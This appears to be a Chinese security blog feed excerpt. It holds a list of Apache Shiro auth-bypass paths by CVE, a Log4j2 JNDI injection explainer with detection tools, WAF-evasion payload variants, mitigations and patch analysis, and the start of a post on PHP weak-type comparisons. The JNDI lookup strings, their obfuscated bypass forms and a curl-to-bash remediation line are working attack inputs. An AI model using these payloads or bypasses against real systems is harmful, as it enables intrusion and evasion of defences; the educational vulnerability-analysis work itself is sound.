    <content type="html"><![CDATA[<h2 id="权限绕过原理"><a href="#权限绕过原理" class="headerlink" title="权限绕过原理"></a>权限绕过原理</h2><p>配置<code>shiroConfig-Filter</code>里的URL是<code>ant</code>格式，路径支持通配符表示。具体逻辑在<code>AntPathMatcher#doMatch</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?：匹配一个字符</span><br><span class="line">*：匹配零个或多个字符串</span><br><span class="line">**：匹配路径中的零个或多个路径</span><br></pre></td></tr></table></figure><h2 id="payload总结"><a href="#payload总结" class="headerlink" title="payload总结"></a>payload总结</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p><code>CVE-2016-6802</code> 在访问路径前加上&#x2F;任意目录名&#x2F;..&#x2F;，即可绕过访问</p></li><li><p><code>CVE-2020-1957</code> &#x2F;demo&#x2F;..;&#x2F;admin&#x2F;index,其中demo为授权路径，admin&#x2F;index为鉴权路径 &#x2F;.;&#x2F;hello&#x2F;aaaa</p></li><li><p><code>CVE-2020-11989</code> admin&#x2F;page%252fABCDEFG其中admin&#x2F;page为鉴权路径，ABCDEFG为随意字符串 &#x2F;hello&#x2F;a%25%32%66a &#x2F;;&#x2F;test&#x2F;hello&#x2F;aaa</p></li><li><p><code>CVE-2020-13933</code> admin&#x2F;%3BABCDEFG，其中admin为鉴权路径，ABCDEFG为随意字符串</p></li><li><p><code>CVE-2020-17510</code> admin&#x2F;%2e</p></li><li><p><code>CVE-2020-17523</code> admin&#x2F;%20，其中admin为鉴权路径</p></li><li><p><code>CVE-2022-32532</code> 特定条件下的漏洞利用：当shiro使用了RegExPatternMatcher进行路由匹配时，由于Java的正则Pattern.matches解析.默认是不匹配r或者n的，因此当path中带有%0a时可绕过正则匹配 &#x2F;permit&#x2F;a%0any</p></li></ul><h2 id="四个CVE分析"><a href="#四个CVE分析" class="headerlink" title="四个CVE分析"></a>四个CVE分析</h2><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://yagsheg.com/2021/08/02/shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E7%B3%BB%E5%88%97%E6%B1%87%E6%80%BB/">shiro 权限绕过系列汇总</a></li><li><a href="https://github.com/Threezh1/JSFinder">shiro权限绕过总结</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;权限绕过原理&quot;&gt;&lt;a href=&quot;#权限绕过原理&quot; class=&quot;headerlink&quot; title=&quot;权限绕过原理&quot;&gt;&lt;/a&gt;权限绕过原理&lt;/h2&gt;&lt;p&gt;配置&lt;code&gt;shiroConfig-Filter&lt;/code&gt;里的URL是&lt;code&gt;ant&lt;/code</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>深入理解Log4j2远程命令执行漏洞</title>
    <link href="https://yinwc.github.io/2021/12/12/Log4j2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://yinwc.github.io/2021/12/12/Log4j2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-12-12T02:46:33.000Z</published>
    <updated>2023-07-01T01:12:18.684Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3">漏洞危害</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">漏洞原理</a><ul><li><a href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86">基础知识</a><ul><li><a href="#jndi">JNDI</a></li><li><a href="#ldap">LDAP</a></li><li><a href="#codebase">Codebase</a></li></ul></li><li><a href="#log4j2%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86">Log4j2漏洞原理</a><ul><li><a href="#java%E4%BD%8E%E7%89%88%E6%9C%AC%E5%8E%9F%E7%90%86%E7%BD%91%E4%B8%8A%E6%99%AE%E9%81%8D%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86">Java低版本原理（网上普遍攻击原理）</a></li><li><a href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B%E4%B8%8E%E5%8E%9F%E7%90%86">攻击流程与原理</a></li></ul></li></ul></li><li><a href="#%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95">测试方法</a></li><li><a href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE">修复建议</a><ul><li><a href="#%E6%96%B9%E6%A1%88a%E4%B8%B4%E6%97%B6%E6%96%B9%E6%A1%88">方案A（临时方案）：</a></li><li><a href="#%E6%96%B9%E6%A1%88b%E5%AE%98%E6%96%B9%E4%BF%AE%E5%A4%8D">方案B（官方修复）：</a></li></ul></li><li><a href="#%E8%A1%A5%E4%B8%81%E5%88%86%E6%9E%90">补丁分析</a><ul><li><a href="#rc1">rc1</a><ul><li><a href="#rc1-%E7%BB%95%E8%BF%87">rc1 绕过</a></li></ul></li><li><a href="#rc2">rc2</a></li></ul></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ol><li><p>Apache Log4j2 是 Apache 软件基金会下的一个开源的基于 Java 的日志记录工具。Log4j2 是一个 Log4j 1.x 的重写，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。由于其优异的性能而被广泛的应用于各种常见的 Web 服务中。从Apache Log4j2 漏洞影响面查询的统计来看，影响多达60644个开源软件，涉及相关版本软件包更是达到了321094个。而本次漏洞的触发方式简单，利用成本极低，可以说是一场java生态的‘浩劫’。</p></li><li><p>java日志模块存在远程命令执行漏洞可直接控制目标服务器，<strong>攻击者利用难度极低</strong>,  <strong>Java 技术栈业务及使用java开源软件需要重点关注</strong>，由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，<strong>触发远程代码执行漏洞</strong>。</p></li><li><p>该漏洞可通过 critical、error、warining、notice、info、debug等日志级别触发，只需部分日志内容可控，<strong>大量开源组件被波及</strong>，包括 ELK、 Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。目前漏洞细节已被公开，攻击者可利用该漏洞进行远程命令执行（可导致服务器沦陷等）。</p></li><li><p>漏洞影响范围：</p><ul><li>Apache Log4j 1.x (1.x默认不支持jndi，若启用JMS的appender受影响，没有添加过Appenders组件相关配置或函数内未引用Appenders就没有影响)</li><li>Apache Log4j 远程命令执行漏洞 影响版本： <strong>Apache Log4j 2.x &lt; 2.15.0-rc2</strong></li><li>Apache Log4j 拒绝服务漏洞（CVE-2021-45105）影响版本：2.0-alpha1 至 2.16.0 (如果是JAVA7 可以通过升级到2.12.3解决此问题)</li><li>Apache dubbo的影响参考官方<a href="https://github.com/apache/dubbo/issues/9380">https://github.com/apache/dubbo/issues/9380</a></li></ul></li></ol><p><a href="https://www.cnblogs.com/xfeiyun/p/15999955.html">Log4j和Log4j2的区别</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h4><ul><li><p>总结：JNDI是Java提供的Java命名和目录接口。通过调用JNDI的API可以定位资源和其他程序对象。</p><ul><li>JNDI是Java EE的重要部分，JNDI可访问的现有的目录及服务有:JDBC、LDAP、RMI、DNS、NIS、CORBA。</li></ul></li><li><p><code>JNDI</code>全称 Java Naming and Directory Interface（Java命名和目录接口）。JNDI是Java平台的一个标准扩展，提供了一组接口、类和关于命名空间的概念。JDNI是provider-based的技术(如同其它很多Java技术一样)，暴露了一个API和一个<strong>服务供应接口（SPI）</strong>。这意味着任何基于名字的技术都能通过JNDI而提供服务，只要JNDI支持这项技术。很多J2EE技术，包括EJB都依靠JNDI来组织和定位实体。</p></li><li><p><code>JDNI通过绑定的概念将对象和名称联系起来</code>。在一个文件系统中，文件名被绑定给文件。在DNS中，一个IP地址绑定一个URL。在目录服务中，一个对象名被绑定给一个对象实体。</p></li></ul><p>参考文章：<a href="https://www.cnblogs.com/xdp-gacl/p/3951952.html">JNDI学习总结(一)——JNDI数据源的配置</a></p><h4 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h4><p><code>LDAP</code>全称 Light Directory Access Protocol（轻型目录访问协议），是基于X.500标准的轻量级目录访问协议。</p><ul><li><p>总结：LDAP是一个目录服务，可以通过目录路径查询到对应目录下的对象（文件）等。即其也是JNDI的实现，通过名称（目录路径）查询到对象（目录下的文件）</p></li><li><p>LDAP目录服务是由目录数据库和一套访问协议组成的系统。</p><ul><li>目录是一个为查询、浏览和搜索而优化的数据库，它成树状结构组织数据，类似文件目录一样。</li><li>目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，支持过滤功能。</li><li>目录数据库和关系数据库不同，它有优异的读性能，但写性能差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。所以目录天生是用来查询的，就好象它的名字一样。</li></ul></li></ul><p>参考：<a href="https://www.cnblogs.com/wilburxu/p/9174353.html">LDAP概念和原理介绍</a></p><h4 id="Codebase"><a href="#Codebase" class="headerlink" title="Codebase"></a>Codebase</h4><p>Codebase就是存储代码或者编译文件的服务。其可以根据名称返回对应的代码或者编译文件，如果根据类名，提供类对应的Class文件。</p><h3 id="Log4j2漏洞原理"><a href="#Log4j2漏洞原理" class="headerlink" title="Log4j2漏洞原理"></a>Log4j2漏洞原理</h3><h4 id="Java低版本原理（网上普遍攻击原理）"><a href="#Java低版本原理（网上普遍攻击原理）" class="headerlink" title="Java低版本原理（网上普遍攻击原理）"></a>Java低版本原理（网上普遍攻击原理）</h4><p>原理概述：</p><ul><li><code>Log4j2</code>漏洞总的来说就是：因为<code>Log4j2</code>默认支持解析<code>ldap/rmi</code>协议（只要打印的日志中包括ldap&#x2F;rmi协议即可），并会通过名称从ldap服务端其获取对应的Class文件，并使用ClassLoader在本地加载Ldap服务端返回的Class类。这就为攻击者提供了攻击途径，攻击者可以在界面传入一个包含恶意内容（会提供一个恶意的Class文件）的ldap协议内容（如：恶意内容${jndi:ldap:&#x2F;&#x2F;localhost:9999&#x2F;Test}恶意内容），该内容传递到后端被log4j2打印出来，就会触发恶意的Class的加载执行（可执行任意后台指令），从而达到攻击的目的。</li></ul><h4 id="攻击流程与原理"><a href="#攻击流程与原理" class="headerlink" title="攻击流程与原理"></a>攻击流程与原理</h4><p><strong>总结：</strong></p><p>1、攻击则发送带有恶意<code>Ldap</code>内容的字符串，让服务通过<code>log4j2</code>打印<br>2、<code>log4j2</code>解析到<code>ldap</code>内容，会调用Java底层的<code>Lookup</code>方法，完成<code>Ldap</code>的<code>Lookup</code>操作。<br>3、<code>Java</code>底层请求<code>Ldap</code>服务器（恶意服务器），得到了<code>Codebase</code>地址，告诉客户端去该地址获取他需要的类。<br>4、<code>Java</code>请求<code>Codebase</code>服务器(恶意服务器)获取到对应的类（恶意类），并在本地加载和实例化（触发恶意代码）。</p><p><img src="/2021/12/12/Log4j2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1.jpg" alt="Log4j2远程命令执行漏洞"></p><p><strong>具体攻击流程：</strong></p><ol><li>首先攻击者遭到存在风险的接口（接口会将前端输入直接通过日志打印出来），然后向该接口发送攻击内容：<code>$&#123;jndi:ldap://localhost:9999/Test&#125;</code>。</li><li>被攻击服务器接收到该内容后，通过Logj42工具将其作为日志打印。</li><li>此时<code>Log4j2</code>会解析<code>$&#123;&#125;</code>，读取出其中的内容。判断其为<code>Ldap</code>实现的<code>JNDI</code>。于是调用Java底层的<code>Lookup</code>方法，尝试完成<code>Ldap</code>的<code>Lookup</code>操作。</li><li>请求<code>Ldap</code>服务器，获取到<code>Ldap</code>协议数据。<code>Ldap</code>会返回一个<code>Codebase</code>告诉客户端，需要从该<code>Codebase</code>去获取其需要的Class数据。</li><li>请求<code>Ldap</code>中返回的<code>Codebase</code>路径，去<code>Codebase</code>下载对应的<code>Class</code>文件，并通过类加载器将其加载为Class类，然后调用其默认构造函数将该Class类实例化成一个对象。就会导致我们攻击代码中的静态块中的内容被执行。</li></ol><h2 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h2><p>1、dnslog手动验证方法</p><ul><li>首先在dnslog平台获取一个子域名，尝试构造payload，插入请求数据包。<br><code>$&#123;jndi:ldap://xxxx.dnslog.cn&#125;</code></li><li>通过dnslog平台是否收到请求，初步判断目标环境是否存在漏洞。</li></ul><p>2、Log4j-scan等一些自动化工具</p><ul><li>Log4j-scan是一款用于查找log4j2漏洞的python脚本，支持url检测，支持HTTP请求头和POST数据参数进行模糊测试。</li><li>github项目地址：<a href="https://github.com/fullhunt/log4j-scan">https://github.com/fullhunt/log4j-scan</a></li></ul><p>3、Log4j2 burp被动扫描插件</p><ul><li>通过插件的方式，将log4j2漏洞检测能力集成到burp，从而提升安全测试人员的漏洞发现能力。</li><li>github项目地址：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/f0ng/log4j2burpscanner</span><br><span class="line">https://github.com/Jeromeyoung/log4j2burpscanner</span><br></pre></td></tr></table></figure></li></ul><p>4、AWVS扫描log4j2漏洞<br>AWVS14最新版本支持log4j2漏洞检测，支持批量扫描</p><p>5、制品级Log4j2漏洞检测工具<br>检测工具基于腾讯安全的binAuditor，支持 Jar&#x2F;Ear&#x2F;War包上传，一键上传即可获取到检测结果。<br>检测地址：<br><code>https://bsca.ms.qq.com/</code></p><p>6、Log4j2 本地检测工具<br>基于长亭牧云产品提取出来的Log4j2本地检测工具，可快速发现当前服务器存在风险的 log4j2 应用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://log4j2-detector.chaitin.cn/</span><br></pre></td></tr></table></figure><h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>实用WAF规则如对 <strong>${</strong> 、<strong>jndi</strong>、<strong>ldap</strong>、<strong>rmi</strong> 等关键词规则的防护，容易被绕过，绕过方法如下：</p><ol><li><p>利用编码绕过：大小编码，递归URL编码，Unicode编码（JSON格式），十六进制编码等</p></li><li><p>利用log4j所支持的lookup方法（具体支持的方法和log4j版本有关）绕过：</p><p><code>$&#123;lower:jndi&#125;</code>、<code>$&#123;upper:jndi&#125;</code></p><ul><li><p>支持嵌套替换</p><p><code>$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$ &#123;lower:ldap&#125;://x&#125; =&gt; $&#123; jndi://ldap://x&#125;</code></p></li></ul></li><li><p>利用<strong>log4j</strong>在解析时的分隔符<code>:-</code>和特殊字符:</p><ul><li><code>$&#123;::-j&#125; =&gt; j</code> (分隔符<code>“:-”</code>及之前的部分被截掉)</li><li><code>$&#123;env:ENV_NAME:-j&#125;</code>、 <code>$&#123;xksV:Xgi:-j&#125;</code>、 <code>$&#123;ozI:Kgh:Qn:TXM:-j&#125;</code>均 会被转为 <code>j</code></li></ul></li><li><p>特殊字符利用: <code>$&#123;upper:ı&#125; =&gt; i</code> ( <strong>ı</strong> 是拉丁字符 U+0131)，这里的 <strong>ı</strong> 不是 <strong>i和I</strong>，经过 toUpperCase 就会转变成 I。从而绕过了 jndi 关键词的拦截。</p></li><li><p><strong>不出现port，避免被waf匹配ip:port</strong></p><ul><li>&#96;&#96;&#96;<br>${jndi:ldap:192.168.1.1&#x2F;a}<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">6. **IP添加包裹**</span><br><span class="line"></span><br><span class="line">   - ```</span><br><span class="line">     $&#123;jndi:ldap://[192.168.34.96]/a&#125;</span><br><span class="line">     $&#123;jndi:ldap://[192.168.34.96]]/a&#125; </span><br><span class="line">     LdapURL取出&quot;[ip]&quot;，LdapCtx去除[]获得ip，两种情况下端口都是389</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>不出现ip和端口</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap:/a&#125;</span><br><span class="line">此时相当于ldap://localhost:389/a</span><br><span class="line"></span><br><span class="line">原因：这种情况主要是来自于LdapURL解析URL时出错，导致host=null，port=-1，而后LdapCtx中发现host=null，则将host置为localhost，毕竟这样做看起来是可信的</span><br><span class="line">原理是，LdapURL解析时有个关键处理如下</span><br><span class="line">this.hasAuthority = var1.startsWith(&quot;//&quot;, var2);   // var2=第一个冒号的索引</span><br><span class="line">if (hasAuthority)&#123;</span><br><span class="line">    解析获取host和port</span><br><span class="line">&#125;</span><br><span class="line">此时不出现://这个整体，就可以直接跳出host和port的获取，而后在LdapCtx中对host=null时，赋值为localhost，对port=默认值-1时，赋值为389</span><br></pre></td></tr></table></figure></li><li><p><strong>不出现jndi:ldap关键字</strong></p><ul><li>通过upperCase、fastjson的unicode编码等方法可以避免该关键字（<a href="https://b1ue.cn/archives/513.[html](https://www.isolves.com/it/cxkf/yy/html5/)">https://b1ue.cn/archives/513.[html](https://www.isolves.com/it/cxkf/yy/html5/)</a> ）</li></ul></li></ol><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>为避免最新版本被再次绕过，在执行方案B的同时，也强烈建议执行方案A中的措施之一） ：</p><h3 id="方案A（临时方案）："><a href="#方案A（临时方案）：" class="headerlink" title="方案A（临时方案）："></a>方案A（临时方案）：</h3><ul><li><p>五选一必须执行：</p><ul><li>修改jvm参数:  -Dlog4j2.formatMsgNoLookups&#x3D;true <strong>（仅在Apache log4j 2.10.0&gt;&#x3D;版本中有效）</strong> </li><li>修改配置文件: 在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups&#x3D;true（<strong>仅在Apache log4j 2.10.0&gt;&#x3D;版本中有效</strong>）</li><li>代码层加固： System.setProperty(“log4j2.formatMsgNoLookups”, “true”);（<strong>仅在Apache log4j 2.10.0&gt;&#x3D;版本中有效</strong>）</li><li>移除log4j-core包中JndiLookup 类文件，并重启服务（需各部门及业务线评估条件是否允许，需验证移除后对稳定性的影响）<ul><li>具体命令：zip -q -d log4j-core-<em>.jar org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiLookup.class <strong># 如果业务上是打好包的jar包，需要解压后寻找 log4j-core-*.jar，操作完了之后，再打回 jar 包</strong></em></li><li>一键查询机器上所有log4j-core-*.jar 并删除 JndiLookup.class<ul><li><p>1、方法一：<br>1、自行找到log4j-core-*.jar所在目录，然后执行path命令<br>2、执行完了，记得重启服务，重启服务，重启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd log4j-core-*.jar所在的目录</span><br><span class="line">zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</span><br></pre></td></tr></table></figure></li><li><p>2、方法二：<br>1、执行一键处置脚本<br>2、脚本原理：查询机器上所有log4j-core-*.jar 文件，然后执行path命令删除 JndiLookup.class, 采用该方法前建议自行做下实际环境的测试，然后分布灰度执行<br><code>curl http://xxx.xxx.xxx.xxx/DelJndiFromLog4jCoreJar.sh | bash </code></p></li><li><p>3、Logstash 处置方式<br><code>zip -q -d &lt;LOGSTASH_HOME&gt;/logstash-core/lib/jars/log4j-core-2.* org/apache/logging/log4j/core/lookup/JndiLookup.class</code><br>然后重启 logstash 即可</p></li><li><p>4、注意事项</p><ul><li>有的环境是将 log4j-core-<em>.jar 二次打包成 jar 包（多层jar打包），需要先解压外层jar包 ，让 log4j-core-</em>.jar 以单文件的形式存在于服务器上，然后执行方法一或者方法二的 path 命令</li><li>执行完后再重新打包，解包打包参考如下<ul><li>解包<ul><li><code>jar -xvf hello.jar</code></li></ul></li><li>打包<ul><li><code>jar -cvf0m hello.jar ./META-INF/MANIFEST.MF .</code></li></ul></li></ul></li></ul></li></ul></li></ul></li></ul></li><li><p>禁用JNDI服务（需各部门及业务线评估条件是否允许）</p><ul><li>对存在sprint boot的server关闭jndi服务（在不影响业务的情况下），操作方式：在项目的根目录中编辑（如果无就新建）spring.properties或application.properties配置文件，添加属性以及值spring.jndi.ignore&#x3D;true。</li></ul></li><li><p>二选一强烈建议执行：</p><ul><li>有公网权限的下掉公网权限，避免因为jndi出网被反弹shell控制机器权限，若有必要业务请采取出网白名单方式；</li><li>接入OpenRasp</li></ul></li></ul><h3 id="方案B（官方修复）："><a href="#方案B（官方修复）：" class="headerlink" title="方案B（官方修复）："></a>方案B（官方修复）：</h3><ul><li>更新为目前最新版本：<ul><li>官方地址：<a href="https://logging.apache.org/log4j/2.x/download.html">https://logging.apache.org/log4j/2.x/download.html#</a></li><li>Baidu Maven仓库（<strong>目前已经是2.16版本，以上方官方地址最新版为准</strong>）：<a href="http://maven.scm.baidu.com:8081/nexus/content/groups/public/org/apache/logging/log4j/log4j-core/2.16.0/">http://maven.scm.baidu.com:8081/nexus/content/groups/public/org/apache/logging/log4j/log4j-core/2.16.0/</a></li></ul></li></ul><h2 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h2><h3 id="rc1"><a href="#rc1" class="headerlink" title="rc1"></a>rc1</h3><p>2.15.0-rc1</p><ul><li><p>总结：rc1补丁通过对JNDI Lookup增加白名单的方式，限制默认可以访问的主机为本地IP，限制默认支持的协议类型为java、ldap、ldaps，限制LDAP协议默认可以使用的Java类型为少数基础类型，从而大大减少了默认的攻击面。</p></li><li><p>具体分析：</p><ul><li><p>通过比较2.15.0-rc1和该版本之前最后一个版本2.14.1之间的差异，可以发现Log4j2团队在12月5日提交了一个名为Restrict LDAP access via JNDI (#608)的commit。该commit的详细内容如下链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3</span><br></pre></td></tr></table></figure></li><li><p>除去一些测试代码和辅助代码，该commit最主要内容是在3.5章节中提到的 JndiManager.lookup()方法增加了几种限制，分别是<code>allowedHosts</code>、<code>allowedClasses</code>、<code>allowedProtocols</code>。</p></li><li><p>各个限制的内容分别如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">allowedHosts</span><br><span class="line"></span><br><span class="line">allowedClasses</span><br><span class="line"></span><br><span class="line">allowedProtocols</span><br></pre></td></tr></table></figure></li><li><p>可以看到，rc1补丁通过对JNDI Lookup增加白名单的方式，限制默认可以访问的主机为本地IP，限制默认支持的协议类型为java、ldap、ldaps，限制LDAP协议默认可以使用的Java类型为少数基础类型，从而大大减少了默认的攻击面。</p></li></ul></li></ul><h4 id="rc1-绕过"><a href="#rc1-绕过" class="headerlink" title="rc1 绕过"></a>rc1 绕过</h4><ul><li><p>发生原因：rc1默认不对URISyntaxException异常做任何处理，</p></li><li><p>绕过方法：通过构建一个简单的带空格的异形URI地址（127.0.0.1:8888&#x2F; 和exp之间）</p></li></ul><h3 id="rc2"><a href="#rc2" class="headerlink" title="rc2"></a>rc2</h3><p>2.15.0-rc2</p><ul><li>通过比较2.15.0-rc1和2.15.0-rc2之间的差异，可以发现Log4j2团队在12月10日提交了一个名为Handle URI exception的commit。该commit的详细内容如下链接：</li></ul><p><a href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658">https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658</a></p><p>该commit主要内容是对rc1中JndiManager.lookup()方法里的catch代码块进行了修改：</p><ul><li>当URISyntaxException异常被捕获时，直接返回null。从而无法使用上一章节的异形URI地址绕过。</li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/hilaryfrank/article/details/121920264">Log4j2注入漏洞(CVE-2021-44228)万字深度剖析</a></p><p><a href="https://www.anquanke.com/post/id/264176#h3-16">Log4j2的JNDI注入漏洞（CVE-2021-44228）原理分析与思考</a></p><p><a href="https://droidkali.github.io/2021/12/30/Log4j2-RCE.html">Log4j2 RCE漏洞复现</a></p><p><a href="https://www.jianshu.com/p/35316d9a3b87">Log4j2漏洞复现（小白向教程）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8D%B1%E5%AE%B3&quot;&gt;漏洞危害&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86&quot;&gt;漏洞原</summary>
      
    
    
    
    
    <category term="漏洞" scheme="https://yinwc.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>PHP弱类型漏洞总结</title>
    <link href="https://yinwc.github.io/2021/08/06/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://yinwc.github.io/2021/08/06/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</id>
    <published>2021-08-06T03:27:34.000Z</published>
    <updated>2023-04-23T05:42:42.422Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PHP弱类型简介"><a href="#PHP弱类型简介" class="headerlink" title="PHP弱类型简介"></a>PHP弱类型简介</h2><p>​PHP属于弱类型语言，PHP不必声明该变量的数据类型，PHP会根据变量的值自动把变量的值转换为所需的数据类型，但在这个自动转换过程中可能存在安全问题。</p><p>​常见可能导致弱类型漏洞的有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1)== </span><br><span class="line">2)switch() </span><br><span class="line">3)in_array() </span><br><span class="line">4)array_search() </span><br><span class="line">5)is_number() </span><br><span class="line">6)strcmp() </span><br><span class="line">7)Magic Hashes</span><br></pre></td></tr></table></figure><h2 id="类型转换问题"><a href="#类型转换问题" class="headerlink" title="类型转换问题"></a>类型转换问题</h2><p>​类型转换是无法避免的问题。例如需要将GET或者是POST的参数转换为int类型，或者是两个变量不匹配的时候，PHP会自动地进行变量转换。但是PHP是一个弱类型的语言，导致在进行类型转换的时候会存在很多意想不到的问题。</p><h3 id="比较操作符"><a href="#比较操作符" class="headerlink" title="比较操作符"></a>比较操作符</h3><h4 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h4><ul><li>当不同类型的变量进行比较的时候就会存在变量转换的问题，在转换之后就有可能会存在问题。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</span><br><span class="line"></span><br><span class="line">== 在进行比较的时候，会先将字符串类型转化成相同，再比较</span><br></pre></td></tr></table></figure><p>eg：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a=null;$b=flase ; //true</span><br><span class="line">$a=&#x27;&#x27;;$b=null;//true</span><br><span class="line">0==&#x27;0&#x27;//true</span><br><span class="line">0 == &#x27;abcdefg&#x27;//true</span><br><span class="line">0 === &#x27;abcdefg&#x27;//false</span><br><span class="line">1 == &#x27;1abcdef&#x27;//true</span><br></pre></td></tr></table></figure><h4 id="Hash比较"><a href="#Hash比较" class="headerlink" title="Hash比较"></a>Hash比较</h4><ul><li>在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。所以上面例子中2个数的值都是0因而就相等了。如果不满足0e\d+这种模式就不会相等。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;0e132456789&quot;==&quot;0e7124511451155&quot; //true</span><br><span class="line">&quot;0e123456abc&quot;==&quot;0e1dddada&quot;//false</span><br><span class="line">&quot;0e1abc&quot;==&quot;0&quot;     //true</span><br></pre></td></tr></table></figure><h4 id="十六进制转换"><a href="#十六进制转换" class="headerlink" 